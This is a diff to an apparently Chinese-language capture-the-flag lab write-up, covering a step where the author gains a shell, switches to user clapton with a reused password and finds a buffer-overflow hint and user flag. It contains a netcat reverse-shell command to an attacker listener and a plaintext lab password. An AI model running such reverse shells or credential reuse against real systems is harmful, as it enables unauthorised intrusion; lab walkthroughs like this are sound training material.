@@ -96,4 +96,38 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ```
 
-经过一番排查，我们发现用户clapton的密码被重复使用
+经过一番排查，我们发现用户clapton的密码被重复使用su一下
+
+# 提权
+反弹shell
+```c
+> nc -e /bin/bash 192.168.44.128 9001
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lnvp 9001
+
+script /dev/null -c bash
+
+su clapton //yaraklitepe
+```
+
+```c
+clapton@debian:~$ cat note.txt  
+cat note.txt
+buffer overflow is the way. ( ° ʖ °)
+
+if you're new on 32bit bof then check these:
+翻译
+缓冲区溢出就是这样。
+
+如果您是 32 位的新手，请检查以下内容：
+https://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.html
+https://samsclass.info/127/proj/lbuf1.htm
+  
+  
+clapton@debian:~$ cat user.txt
+cat user.txt
+F569AA95FAFF65E7A290AB9ED031E04F
+```
+上面已经提示了有缓冲区溢出漏洞还给出了教程链接，来学习学习
+首先我们先下载靶机里面的input 文件
